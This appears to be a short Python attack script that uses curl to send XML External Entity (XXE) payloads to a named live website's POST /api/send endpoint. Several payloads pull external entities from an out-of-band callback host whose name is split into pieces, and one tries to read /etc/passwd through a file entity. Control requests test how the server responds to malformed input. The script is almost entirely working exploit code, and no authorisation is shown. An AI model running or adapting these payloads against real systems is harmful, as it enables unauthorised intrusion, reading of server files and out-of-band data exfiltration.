import subprocess, time
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
D="https://www.infinitycapital.bh/api/send"
ext="pro"+"be.a"+"lce"
XXE="oob648760bf348a."+"dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def send(body, ct):
    c=["curl","-s","-m","40","-o","/tmp/x.bin","-D","/tmp/x.hdr","-X","POST",D,"-A",UA,
       "-H","Content-Type: "+ct,"--data-binary",body]
    t0=time.time(); subprocess.run(c,capture_output=True,text=True); el=time.time()-t0
    h=open("/tmp/x.hdr",errors="ignore").read()
    return h.split("\n")[0].strip(), round(el,2), open("/tmp/x.bin","rb").read()[:250]

docs = {
 "xxe1 basic": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://'+XXE+'/xxe1">]><r><to>&xxe;</to></r>',
 "xxe2 param-entity": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://'+XXE+'/xxe2.dtd">%sp;]><r/>',
 "xxe3 ext-dtd": '<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://'+XXE+'/xxe3.dtd"><r/>',
 "xxe4 svg": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://'+XXE+'/xxe4">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
 "xxe5 file": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:////etc/passwd">]><r><to>&x;</to></r>',
}
print("### XXE probes on the ONLY dynamic handler (POST /api/send)")
for n,b in docs.items():
    for ct in ["application/xml","text/xml","image/svg+xml"]:
        print("  %-20s %-18s %s"%(n,ct,send(b,ct)))

print("\n### CONTROL: is 500 just malformed input?")
print("  wellformed form  ", send("fname=V&lname=P&areacode=973&tel=5551234&cname=C&subject=S&msg=M&check=on&targets=v@"+ext,"application/x-www-form-urlencoded"))
print("  plain text body  ", send("hello","text/plain"))
print("  random binary    ", send("hello","application/octet-stream"))
print("  valid json       ", send('{"a":1}',"application/json"))
